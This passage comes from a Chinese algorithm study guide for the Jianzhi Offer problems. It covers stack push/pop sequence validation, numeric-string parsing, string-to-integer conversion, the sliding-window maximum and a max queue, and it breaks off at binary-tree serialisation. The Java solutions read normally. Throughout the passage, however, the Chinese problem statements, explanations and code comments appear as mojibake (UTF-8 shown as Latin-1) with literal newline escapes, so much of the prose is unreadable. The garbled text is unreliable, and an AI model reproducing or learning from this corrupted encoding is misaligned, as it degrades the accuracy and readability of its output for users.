ˆé¡¶å…ƒç´  \\=\\=\\= å¼¹å‡ºåºåˆ—çš„å½“å‰å…ƒç´ **â€ æ˜¯å¦æˆç«‹ï¼Œå°†ç¬¦åˆå¼¹å‡ºåºåˆ—é¡ºåºçš„æ ˆé¡¶å…ƒç´ å…¨éƒ¨å¼¹å‡ºã€‚\n\n**ç®—æ³•æµç¨‹ï¼š**\n\n1.  **åˆå§‹åŒ–ï¼š** è¾…åŠ©æ ˆ stackï¼Œå¼¹å‡ºåºåˆ—çš„ç´¢å¼• i ï¼›\n2.  **éå†å‹æ ˆåºåˆ—ï¼š** å„å…ƒç´ è®°ä¸º num ï¼›\n    1.  å…ƒç´  num å…¥æ ˆï¼›\n    2.  å¾ªç¯å‡ºæ ˆï¼šè‹¥ stack çš„æ ˆé¡¶å…ƒç´  \\=\\=\\= å¼¹å‡ºåºåˆ—å…ƒç´  popped\\[i\\] ï¼Œåˆ™æ‰§è¡Œå‡ºæ ˆä¸ i++ ï¼›\n3.  **è¿”å›å€¼ï¼š** è‹¥ stack ä¸ºç©ºï¼Œåˆ™æ­¤å¼¹å‡ºåºåˆ—åˆæ³•ã€‚\n\n```java\nclass Solution {\n    public boolean validateStackSequences(int[] pushed, int[] popped) {\n        Stack<Integer> stack = new Stack<>();\n        int i = 0;\n        for(int num : pushed) {\n            stack.push(num); // num å…¥æ ˆ\n            while(!stack.isEmpty() && stack.peek() == popped[i]) { // å¾ªç¯åˆ¤æ–­ä¸å‡ºæ ˆ\n                stack.pop();\n                i++;\n            }\n        }\n        return stack.isEmpty();\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºåˆ—è¡¨ pushed çš„é•¿åº¦ï¼›æ¯ä¸ªå…ƒç´ æœ€å¤šå…¥æ ˆä¸å‡ºæ ˆä¸€æ¬¡ï¼Œå³æœ€å¤šå…± 2N æ¬¡å‡ºå…¥æ ˆæ“ä½œã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** è¾…åŠ©æ ˆ stack æœ€å¤šåŒæ—¶å­˜å‚¨ N ä¸ªå…ƒç´ ã€‚\n\n# ç¬¬ 26 å¤© å­—ç¬¦ä¸²ï¼ˆä¸­ç­‰ï¼‰\n\n## 20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²\n\n### é¢˜ç›®\n\n>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦è¡¨ç¤º**æ•°å€¼**ï¼ˆåŒ…æ‹¬æ•´æ•°å’Œå°æ•°ï¼‰ã€‚\n>\n>**æ•°å€¼**ï¼ˆæŒ‰é¡ºåºï¼‰å¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š\n>\n>1.  è‹¥å¹²ç©ºæ ¼\n>2.  ä¸€ä¸ª **å°æ•°** æˆ–è€… **æ•´æ•°**\n>3.  ï¼ˆå¯é€‰ï¼‰ä¸€ä¸ª `'e'` æˆ– `'E'` ï¼Œåé¢è·Ÿç€ä¸€ä¸ª **æ•´æ•°**\n>4.  è‹¥å¹²ç©ºæ ¼\n>\n>**å°æ•°**ï¼ˆæŒ‰é¡ºåºï¼‰å¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š\n>\n>1.  ï¼ˆå¯é€‰ï¼‰ä¸€ä¸ªç¬¦å·å­—ç¬¦ï¼ˆ`'+'` æˆ– `'-'`ï¼‰\n>2.  ä¸‹è¿°æ ¼å¼ä¹‹ä¸€ï¼š\n>    1.  è‡³å°‘ä¸€ä½æ•°å­—ï¼Œåé¢è·Ÿç€ä¸€ä¸ªç‚¹ `'.'`\n>    2.  è‡³å°‘ä¸€ä½æ•°å­—ï¼Œåé¢è·Ÿç€ä¸€ä¸ªç‚¹ `'.'` ï¼Œåé¢å†è·Ÿç€è‡³å°‘ä¸€ä½æ•°å­—\n>    3.  ä¸€ä¸ªç‚¹ `'.'` ï¼Œåé¢è·Ÿç€è‡³å°‘ä¸€ä½æ•°å­—\n>\n>**æ•´æ•°**ï¼ˆæŒ‰é¡ºåºï¼‰å¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š\n>\n>1.  ï¼ˆå¯é€‰ï¼‰ä¸€ä¸ªç¬¦å·å­—ç¬¦ï¼ˆ`'+'` æˆ– `'-'`ï¼‰\n>2.  è‡³å°‘ä¸€ä½æ•°å­—\n>\n>éƒ¨åˆ†**æ•°å€¼**åˆ—ä¸¾å¦‚ä¸‹ï¼š\n>\n>-   `[\"+100\", \"5e2\", \"-123\", \"3.1416\", \"-1E-16\", \"0123\"]`\n>\n>éƒ¨åˆ†**éæ•°å€¼**åˆ—ä¸¾å¦‚ä¸‹ï¼š\n>\n>-   `[\"12e\", \"1a3.14\", \"1.2.3\", \"+-5\", \"12e+5.4\"]`\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šs = \"0\"\n>è¾“å‡ºï¼štrue\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šs = \"e\"\n>è¾“å‡ºï¼šfalse\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šs = \".\"\n>è¾“å‡ºï¼šfalse\n>```\n>\n>ç¤ºä¾‹ 4ï¼š\n>\n>```\n>è¾“å…¥ï¼šs = \"    .1  \"\n>è¾“å‡ºï¼štrue\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šæš´åŠ›\n\n```java\nclass Solution {\n    public boolean isNumber(String s) {\n        if (s == null || s.length() == 0) return false;// sä¸ºç©ºå¯¹è±¡æˆ–sé•¿åº¦ä¸º0,ä¸è¡¨ç¤ºæ•°å€¼\n        //æ˜¯å¦å‡ºç°æ•°å­—ã€å°æ•°ç‚¹ã€eæˆ–è€…E\n        boolean numFlag = false, dotFlag = false, eFlag = false;\n        //å»æ‰é¦–å°¾ç©ºæ ¼\n        s = s.trim();\n        for (int i = 0; i < s.length(); i++) {\n            //åˆ¤å®šä¸ºæ•°å­—ï¼Œåˆ™æ ‡è®°numFlag\n            if (s.charAt(i) >= '0' && s.charAt(i) <= '9') {\n                numFlag = true;\n                //å°æ•°ç‚¹åªå¯ä»¥å‡ºç°å†eä¹‹å‰ï¼Œä¸”åªèƒ½å‡ºç°ä¸€æ¬¡.num  num.num num.éƒ½æ˜¯è¢«å…è®¸çš„\n            } else if (s.charAt(i) == '.' && !dotFlag && !eFlag) {\n                dotFlag = true;\n                //åˆ¤å®šä¸ºeï¼Œéœ€è¦æ²¡å‡ºç°è¿‡eï¼Œå¹¶ä¸”å‡ºè¿‡æ•°å­—äº†\n            } else if ((s.charAt(i) == 'e' || s.charAt(i) == 'E') && !eFlag && numFlag) {\n                eFlag = true;\n                numFlag = false;//é‡ç½®ï¼Œé¿å…eä»¥åæ²¡æœ‰å‡ºç°æ•°å­—ï¼Œé˜²æ­¢å‡ºç°123eæˆ–è€…123e+çš„éæ³•æƒ…å†µ\n                //åˆ¤å®šä¸º+-ç¬¦å·ï¼Œåªèƒ½å‡ºç°åœ¨ç¬¬ä¸€ä½æˆ–è€…ç´§æ¥eåé¢\n            } else if (s.charAt(i) == '+' || s.charAt(i) == '-') {\n                if(i != 0 && s.charAt(i - 1) != 'e' && s.charAt(i - 1) != 'E') \n                  return false; \n            } else return false;//å…¶ä»–æƒ…å†µï¼Œéƒ½æ˜¯éæ³•çš„\n        }\n        //æ˜¯å¦å‡ºç°äº†æ•°å­— \n        return numFlag;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n- ç©ºé—´å¤æ‚åº¦ï¼šO(1)\n\n## 67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°\n\n### é¢˜ç›®\n\n>å†™ä¸€ä¸ªå‡½æ•° StrToIntï¼Œå®ç°æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°è¿™ä¸ªåŠŸèƒ½ã€‚ä¸èƒ½ä½¿ç”¨ atoi æˆ–è€…å…¶ä»–ç±»ä¼¼çš„åº“å‡½æ•°ã€‚\n>\n>é¦–å…ˆï¼Œè¯¥å‡½æ•°ä¼šæ ¹æ®éœ€è¦ä¸¢å¼ƒæ— ç”¨çš„å¼€å¤´ç©ºæ ¼å­—ç¬¦ï¼Œç›´åˆ°å¯»æ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºæ ¼çš„å­—ç¬¦ä¸ºæ­¢ã€‚\n>\n>å½“æˆ‘ä»¬å¯»æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦ä¸ºæ­£æˆ–è€…è´Ÿå·æ—¶ï¼Œåˆ™å°†è¯¥ç¬¦å·ä¸ä¹‹åé¢å°½å¯èƒ½å¤šçš„è¿ç»­æ•°å­—ç»„åˆèµ·æ¥ï¼Œä½œä¸ºè¯¥æ•´æ•°çš„æ­£è´Ÿå·ï¼›å‡å¦‚ç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦æ˜¯æ•°å­—ï¼Œåˆ™ç›´æ¥å°†å…¶ä¸ä¹‹åè¿ç»­çš„æ•°å­—å­—ç¬¦ç»„åˆèµ·æ¥ï¼Œå½¢æˆæ•´æ•°ã€‚\n>\n>è¯¥å­—ç¬¦ä¸²é™¤äº†æœ‰æ•ˆçš„æ•´æ•°éƒ¨åˆ†ä¹‹åä¹Ÿå¯èƒ½ä¼šå­˜åœ¨å¤šä½™çš„å­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦å¯ä»¥è¢«å¿½ç•¥ï¼Œå®ƒä»¬å¯¹äºå‡½æ•°ä¸åº”è¯¥é€ æˆå½±å“ã€‚\n>\n>æ³¨æ„ï¼šå‡å¦‚è¯¥å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªéç©ºæ ¼å­—ç¬¦ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆæ•´æ•°å­—ç¬¦ã€å­—ç¬¦ä¸²ä¸ºç©ºæˆ–å­—ç¬¦ä¸²ä»…åŒ…å«ç©ºç™½å­—ç¬¦æ—¶ï¼Œåˆ™ä½ çš„å‡½æ•°ä¸éœ€è¦è¿›è¡Œè½¬æ¢ã€‚\n>\n>åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œè‹¥å‡½æ•°ä¸èƒ½è¿›è¡Œæœ‰æ•ˆçš„è½¬æ¢æ—¶ï¼Œè¯·è¿”å› 0ã€‚\n>\n>**è¯´æ˜ï¼š**\n>\n>å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒåªèƒ½å­˜å‚¨ 32 ä½å¤§å°çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œé‚£ä¹ˆå…¶æ•°å€¼èŒƒå›´ä¸º \\[âˆ’2<sup>31</sup>,  2<sup>31</sup> âˆ’ 1\\]ã€‚å¦‚æœæ•°å€¼è¶…è¿‡è¿™ä¸ªèŒƒå›´ï¼Œè¯·è¿”å›  INT\\_MAX (2<sup>31</sup> âˆ’ 1) æˆ– INT\\_MIN (âˆ’2<sup>31</sup>) ã€‚\n>\n>**ç¤ºä¾‹ 1:**\n>\n>```\n>è¾“å…¥: \"42\"\n>è¾“å‡º: 42\n>```\n>\n>**ç¤ºä¾‹ 2:**\n>\n>```\n>è¾“å…¥: \"   -42\"\n>è¾“å‡º: -42\n>è§£é‡Š: ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸º '-', å®ƒæ˜¯ä¸€ä¸ªè´Ÿå·ã€‚\n>     æˆ‘ä»¬å°½å¯èƒ½å°†è´Ÿå·ä¸åé¢æ‰€æœ‰è¿ç»­å‡ºç°çš„æ•°å­—ç»„åˆèµ·æ¥ï¼Œæœ€åå¾—åˆ° -42 ã€‚\n>```\n>\n>**ç¤ºä¾‹ 3:**\n>\n>```\n>è¾“å…¥: \"4193 with words\"\n>è¾“å‡º: 4193\n>è§£é‡Š: è½¬æ¢æˆªæ­¢äºæ•°å­— '3' ï¼Œå› ä¸ºå®ƒçš„ä¸‹ä¸€ä¸ªå­—ç¬¦ä¸ä¸ºæ•°å­—ã€‚\n>```\n>\n>**ç¤ºä¾‹ 4:**\n>\n>```\n>è¾“å…¥: \"words and 987\"\n>è¾“å‡º: 0\n>è§£é‡Š: ç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦æ˜¯ 'w', ä½†å®ƒä¸æ˜¯æ•°å­—æˆ–æ­£ã€è´Ÿå·ã€‚\n>å› æ­¤æ— æ³•æ‰§è¡Œæœ‰æ•ˆçš„è½¬æ¢ã€‚\n>```\n>\n>**ç¤ºä¾‹ 5:**\n>\n>```\n>è¾“å…¥: \"-91283472332\"\n>è¾“å‡º: -2147483648\n>è§£é‡Š: æ•°å­— \"-91283472332\" è¶…è¿‡ 32 ä½æœ‰ç¬¦å·æ•´æ•°èŒƒå›´ã€‚ \n>å› æ­¤è¿”å› INT_MIN (âˆ’2^31) ã€‚\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202209071354147.png)\n\n![](https://img.jwt1399.top/img/202209071404320.png)\n\néœ€è¦ä¿è¯æœ¬æ¬¡å¾ªç¯çš„ `res * 10 + chars[j]` ä¸è¶…è¿‡ int å³å¯ä¿è¯ä¸è¶Šç•Œ\n\n- `res > bndry` æ„æ€æ˜¯ï¼Œæ­¤æ—¶ res å·²ç»å¤§äº bndry äº†ï¼Œ* 10 ä¸€å®šè¶Šç•Œ\n- `res == bndry && chars[j] > '7'` çš„æ„æ€æ˜¯ï¼Œå½“ res == bndry æ—¶ï¼Œå³ï¼š214748364 æ­¤æ—¶ res * 10 å˜æˆ 2147483640 æ­¤æ—¶æ²¡è¶Šç•Œï¼Œä½†æ˜¯è¿˜éœ€è¦ + chars[j]ï¼Œè€Œ int æœ€å¤§å€¼ä¸º 2147483647ï¼Œæ‰€ä»¥å½“chars[j] > 7 æ—¶ä¼šè¶Šç•Œ\n\n```java\nclass Solution {\n        public int strToInt(String str) {\n            //å»å‰åç©ºæ ¼\n            char[] chars = str.trim().toCharArray();\n            if (chars.length == 0) return 0;\n            //è®°å½•ç¬¬ä¸€ä¸ªç¬¦åˆæ˜¯å¦ä¸ºè´Ÿæ•°\n            int sign = 1;\n            //å¼€å§‹éå†çš„ä½ç½®\n            int i = 1;\n            //å¦‚æœé¦–ä¸ªéç©ºæ ¼å­—ç¬¦ä¸ºè´Ÿå·ï¼Œé‚£ä¹ˆä»ä½ç½®1å¼€å§‹éå†å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç»“æœéœ€è¦å˜æˆè´Ÿæ•°\n            if (chars[0] == '-') {\n                sign = -1;\n            } else if (chars[0] != '+') { //å¦‚æœé¦–ä¸ªéç©ºæ ¼å­—ç¬¦ä¸æ˜¯è´Ÿå·ä¹Ÿä¸æ˜¯åŠ å·ï¼Œä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹éå†\n                i = 0;\n            }\n            int bndry = Integer.MAX_VALUE / 10; // 214748364\n            int res = 0;\n            for (int j = i; j < chars.length; j++) {\n                //é‡åˆ°éæ•°å­—ç›´æ¥é€€å‡º\n                if (chars[j] > '9' || chars[j] < '0') break;\n                //åˆ¤æ–­æ˜¯å¦è¶Šç•Œ 2^31âˆ’1 = 2147483647\n                if (res > bndry || (res == bndry && chars[j] > '7')) {\n                    //æ ¹æ®å­—ç¬¦ä¸²é¦–è´Ÿå·åˆ¤æ–­è¿”å›æœ€å¤§å€¼è¿˜æ˜¯æœ€å°å€¼\n                    return sign == 1 ? Integer.MAX_VALUE : Integer.MIN_VALUE;\n                }\n                //å­—ç¬¦è½¬æ•°å­—ï¼šâ€œæ­¤æ•°å­—çš„ASCIIç â€ä¸â€œ0çš„ASCIIç â€ç›¸å‡å³å¯\n                res = res * 10 + (chars[j] - '0');\n            }\n            //è¿”å›ç»“æœï¼Œéœ€è¦åˆ¤æ–­æ­£è´Ÿ\n            return res * sign;\n        }\n    }\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** å…¶ä¸­ N ä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼Œçº¿æ€§éå†å­—ç¬¦ä¸²å ç”¨ O(N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** åˆ é™¤é¦–å°¾ç©ºæ ¼åéœ€å»ºç«‹æ–°å­—ç¬¦ä¸²ï¼Œæœ€å·®æƒ…å†µä¸‹å ç”¨ O(N) é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 27 å¤© æ ˆä¸é˜Ÿåˆ—ï¼ˆå›°éš¾ï¼‰\n\n## 59 - I. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ªæ•°ç»„ `nums` å’Œæ»‘åŠ¨çª—å£çš„å¤§å° `k`ï¼Œè¯·æ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—å£é‡Œçš„æœ€å¤§å€¼ã€‚\n>\n>**ç¤ºä¾‹:**\n>\n>```\n>è¾“å…¥: nums = [1,3,-1,-3,5,3,6,7], å’Œ k = 3\n>è¾“å‡º: [3,3,5,5,6,7] \n>è§£é‡Š: \n>\n>  æ»‘åŠ¨çª—å£çš„ä½ç½®                æœ€å¤§å€¼\n>---------------               -----\n>[1  3  -1] -3  5  3  6  7       3\n> 1 [3  -1  -3] 5  3  6  7       3\n> 1  3 [-1  -3  5] 3  6  7       5\n> 1  3  -1 [-3  5  3] 6  7       5\n> 1  3  -1  -3 [5  3  6] 7       6\n> 1  3  -1  -3  5 [3  6  7]      7\n>```\n\n### è§£ç­”\n\nçª—å£å¯¹åº”çš„æ•°æ®ç»“æ„ä¸º **åŒç«¯é˜Ÿåˆ—** ï¼Œæœ¬é¢˜ä½¿ç”¨ **å•è°ƒé˜Ÿåˆ—** è§£å†³é—®é¢˜ã€‚éå†æ•°ç»„æ—¶ï¼Œæ¯è½®ä¿è¯å•è°ƒé˜Ÿåˆ— dequeï¼š\n\n1.  deque å†… **ä»…åŒ…å«çª—å£å†…çš„å…ƒç´ ** â‡’ æ¯è½®çª—å£æ»‘åŠ¨ç§»é™¤äº†å…ƒç´  nums\\[iâˆ’1\\]ï¼Œéœ€å°† deque å†…çš„å¯¹åº”å…ƒç´ ä¸€èµ·åˆ é™¤ã€‚\n2.  deque å†…çš„å…ƒç´  **éä¸¥æ ¼é€’å‡** â‡’ æ¯è½®çª—å£æ»‘åŠ¨æ·»åŠ äº†å…ƒç´  nums\\[j+1] ï¼Œéœ€å°† deque å†…æ‰€æœ‰ <nums\\[j+1\\]çš„å…ƒç´ åˆ é™¤ã€‚\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** åŒç«¯é˜Ÿåˆ— dequeï¼Œç»“æœåˆ—è¡¨ res ï¼Œæ•°ç»„é•¿åº¦ n ï¼›\n2.  **æ»‘åŠ¨çª—å£ï¼š** å·¦è¾¹ç•ŒèŒƒå›´ iâˆˆ\\[1âˆ’k,nâˆ’k\\]ï¼Œå³è¾¹ç•ŒèŒƒå›´ jâˆˆ\\[0,nâˆ’1\\] ï¼›\n    1.  è‹¥ i\\>0 ä¸” é˜Ÿé¦–å…ƒç´  deque\\[0] = è¢«åˆ é™¤å…ƒç´  nums\\[iâˆ’1\\] ï¼Œåˆ™é˜Ÿé¦–å…ƒç´ å‡ºé˜Ÿï¼›\n    2.  åˆ é™¤ deque å†…æ‰€æœ‰ <nums\\[j\\] çš„å…ƒç´ ï¼Œä»¥ä¿æŒ deque é€’å‡ï¼›\n    3.  å°† nums\\[j\\] æ·»åŠ è‡³ deque å°¾éƒ¨ï¼›\n    4.  è‹¥å·²å½¢æˆçª—å£ï¼ˆå³ iâ‰¥0 ï¼‰ï¼šå°†çª—å£æœ€å¤§å€¼ï¼ˆå³é˜Ÿé¦–å…ƒç´  deque\\[0]ï¼‰æ·»åŠ è‡³åˆ—è¡¨ res ï¼›\n3.  **è¿”å›å€¼ï¼š** è¿”å›ç»“æœåˆ—è¡¨ res ï¼›\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        if(nums.length == 0 || k == 0) return new int[0];\n        Deque<Integer> deque = new LinkedList<>();\n        int[] res = new int[nums.length - k + 1];\n        for(int j = 0, i = 1 - k; j < nums.length; i++, j++) {\n            // åˆ é™¤ deque ä¸­å¯¹åº”çš„ nums[i-1]\n            if(i > 0 && deque.peekFirst() == nums[i - 1])\n                deque.removeFirst();\n            // ä¿æŒ deque é€’å‡\n            while(!deque.isEmpty() && deque.peekLast() < nums[j])\n                deque.removeLast();\n            deque.addLast(nums[j]);\n            // è®°å½•çª—å£æœ€å¤§å€¼\n            if(i >= 0)\n                res[i] = deque.peekFirst();\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(n) ï¼š** å…¶ä¸­ n ä¸ºæ•°ç»„ nums é•¿åº¦ï¼›çº¿æ€§éå† nums å ç”¨ O(n) ï¼›æ¯ä¸ªå…ƒç´ æœ€å¤šä»…å…¥é˜Ÿå’Œå‡ºé˜Ÿä¸€æ¬¡ï¼Œå› æ­¤å•è°ƒé˜Ÿåˆ— deque å ç”¨ O(2n)ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(k)ï¼š** åŒç«¯é˜Ÿåˆ— deque ä¸­æœ€å¤šåŒæ—¶å­˜å‚¨ k ä¸ªå…ƒç´ ï¼ˆå³çª—å£å¤§å°ï¼‰ã€‚\n\n## 59 - II. é˜Ÿåˆ—çš„æœ€å¤§å€¼\n\n### é¢˜ç›®\n\n>è¯·å®šä¹‰ä¸€ä¸ªé˜Ÿåˆ—å¹¶å®ç°å‡½æ•° `max_value` å¾—åˆ°é˜Ÿåˆ—é‡Œçš„æœ€å¤§å€¼ï¼Œè¦æ±‚å‡½æ•°`max_value`ã€`push_back` å’Œ `pop_front` çš„**å‡æ‘Š**æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(1)ã€‚\n>\n>è‹¥é˜Ÿåˆ—ä¸ºç©ºï¼Œ`pop_front` å’Œ `max_value` éœ€è¦è¿”å› -1\n>\n>**ç¤ºä¾‹ 1ï¼š**\n>\n>```\n>è¾“å…¥: \n>[\"MaxQueue\",\"push_back\",\"push_back\",\"max_value\",\"pop_front\",\"max_value\"]\n>[[],[1],[2],[],[],[]]\n>è¾“å‡º: [null,null,null,2,1,2]\n>\n>```\n>\n>**ç¤ºä¾‹ 2ï¼š**\n>\n>```\n>è¾“å…¥: \n>[\"MaxQueue\",\"pop_front\",\"max_value\"]\n>[[],[],[]]\n>è¾“å‡º: [null,-1,-1]\n>\n>```\n\n### è§£ç­”\n\nè€ƒè™‘æ„å»ºä¸€ä¸ªé€’å‡åˆ—è¡¨æ¥ä¿å­˜é˜Ÿåˆ—æ‰€æœ‰é€’å‡çš„å…ƒç´  ï¼Œé€’å‡é˜Ÿåˆ—éšç€å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œå®æ—¶æ›´æ–°ï¼Œè¿™æ ·é˜Ÿåˆ—æœ€å¤§å…ƒç´ å°±å§‹ç»ˆå¯¹åº”é€’å‡åˆ—è¡¨çš„é¦–å…ƒç´ ï¼Œå®ç°äº†è·å–æœ€å¤§å€¼ O(1)æ—¶é—´å¤æ‚åº¦ã€‚\n\n![](https://img.jwt1399.top/img/202209082127707.png)\n\nä¸ºäº†å®ç°æ­¤é€’å‡åˆ—è¡¨ï¼Œéœ€è¦ä½¿ç”¨ **åŒå‘é˜Ÿåˆ—** ï¼Œå‡è®¾é˜Ÿåˆ—å·²ç»æœ‰è‹¥å¹²å…ƒç´ ï¼š\n\n1.  å½“æ‰§è¡Œå…¥é˜Ÿ `push_back()` æ—¶ï¼š è‹¥å…¥é˜Ÿä¸€ä¸ªæ¯”é˜Ÿåˆ—æŸäº›å…ƒç´ æ›´å¤§çš„æ•°å­— x ï¼Œåˆ™ä¸ºäº†ä¿æŒæ­¤åˆ—è¡¨é€’å‡ï¼Œéœ€è¦å°†åŒå‘é˜Ÿåˆ— **å°¾éƒ¨æ‰€æœ‰å°äº x çš„å…ƒç´ ** å¼¹å‡ºã€‚\n2.  å½“æ‰§è¡Œå‡ºé˜Ÿ `pop_front()` æ—¶ï¼š è‹¥å‡ºé˜Ÿçš„å…ƒç´ æ˜¯æœ€å¤§å…ƒç´ ï¼Œåˆ™ åŒå‘é˜Ÿåˆ— éœ€è¦åŒæ—¶ **å°†é¦–å…ƒç´ å‡ºé˜Ÿ** ï¼Œä»¥ä¿æŒé˜Ÿåˆ—å’ŒåŒå‘é˜Ÿåˆ—çš„å…ƒç´ ä¸€è‡´æ€§ã€‚\n\n##### å‡½æ•°è®¾è®¡ï¼š\n\nåˆå§‹åŒ–é˜Ÿåˆ— `queue` ï¼ŒåŒå‘é˜Ÿåˆ— `deque` ï¼›\n\n**æœ€å¤§å€¼ `max_value()` ï¼š**\n\n-   å½“åŒå‘é˜Ÿåˆ— `deque` ä¸ºç©ºï¼Œåˆ™è¿”å› âˆ’1 ï¼›\n-   å¦åˆ™ï¼Œè¿”å› `deque` é¦–å…ƒç´ ï¼›\n\n**å…¥é˜Ÿ `push_back()` ï¼š**\n\n1.  å°†å…ƒç´  `value` å…¥é˜Ÿ `queue` ï¼›\n2.  å°†åŒå‘é˜Ÿåˆ—ä¸­é˜Ÿå°¾ **æ‰€æœ‰** å°äº `value` çš„å…ƒç´ å¼¹å‡ºï¼ˆä»¥ä¿æŒ `deque` éå•è°ƒé€’å‡ï¼‰ï¼Œå¹¶å°†å…ƒç´  `value` å…¥é˜Ÿ `deque` ï¼›\n\n**å‡ºé˜Ÿ `pop_front()` ï¼š**\n\n1.  è‹¥é˜Ÿåˆ— `queue` ä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å› âˆ’1 ï¼›\n2.  å¦åˆ™ï¼Œå°† `queue` é¦–å…ƒç´ å‡ºé˜Ÿï¼›\n3.  è‹¥ `deque` é¦–å…ƒç´ å’Œ `queue` é¦–å…ƒç´  **ç›¸ç­‰** ï¼Œåˆ™å°† `deque` é¦–å…ƒç´ å‡ºé˜Ÿï¼ˆä»¥ä¿æŒä¸¤é˜Ÿåˆ— **å…ƒç´ ä¸€è‡´** ï¼‰ ï¼›\n\n```java\nclass MaxQueue {\n    Queue<Integer> queue;\n    Deque<Integer> deque;\n    public MaxQueue() {\n      queue = new LinkedList<>();\n      deque = new LinkedList<>();\n    }\n    \n    public int max_value() {\n      return deque.isEmpty() ? -1 : deque.peekFirst();\n    }\n    //å…¥é˜Ÿ\n    public void push_back(int value) {\n      queue.add(value);      // queue.offer(value);\n      while(!deque.isEmpty() && deque.peekLast() < value)\n        deque.removeLast(); // deque.pollLast();\n      deque.addLast(value); // deque.offerLast(value);\n    }\n    //å‡ºé˜Ÿ\n    public int pop_front() {\n      if(queue.isEmpty()) return -1;\n      // queue é‡Œé¢ä¿å­˜çš„æ˜¯ Integer è€Œé int ï¼Œpeek() è¿”å›çš„æ˜¯ Integer ç±»å‹ï¼Œæ²¡æœ‰è‡ªåŠ¨æ‹†ç®±ï¼Œå› æ­¤éœ€è¦ç”¨ equals() æ¥æ¯”~\n      if(queue.peek().equals(deque.peekFirst()))\n      \tdeque.removeFirst(); // deque.pollFirst();\n      return queue.remove(); // queue.poll();\n    }\n}\n\n/**\n * Your MaxQueue object will be instantiated and called as such:\n * MaxQueue obj = new MaxQueue();\n * int param_1 = obj.max_value();\n * obj.push_back(value);\n * int param_3 = obj.pop_front();\n */\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(1) ï¼š** `max_value()`, `push_back()`, `pop_front()` æ–¹æ³•çš„å‡æ‘Šæ—¶é—´å¤æ‚åº¦å‡ä¸º O(1) ï¼›\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** å½“å…ƒç´ ä¸ªæ•°ä¸º N æ—¶ï¼Œæœ€å·®æƒ…å†µä¸‹`deque` ä¸­ä¿å­˜ N ä¸ªå…ƒç´ ï¼Œä½¿ç”¨ O(N) çš„é¢å¤–ç©ºé—´ï¼›\n\n# ç¬¬ 28 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆå›°éš¾ï¼‰\n\n## 37. åºåˆ—åŒ–äºŒå‰æ ‘\n\n### é¢˜ç›®\n\n>è¯·å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘ã€‚\n>\n>ä½ éœ€è¦è®¾è®¡ä¸€ä¸ªç®—æ³•æ¥å®ç°äºŒå‰æ ‘çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚è¿™é‡Œä¸é™å®šä½ çš„åºåˆ— / ååºåˆ—åŒ–ç®—æ³•æ‰§è¡Œé€»è¾‘ï¼Œä½ åªéœ€è¦ä¿è¯ä¸€ä¸ªäºŒå‰æ ‘å¯ä»¥è¢«åºåˆ—åŒ–ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å¹¶ä¸”å°†è¿™ä¸ªå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºåŸå§‹çš„æ 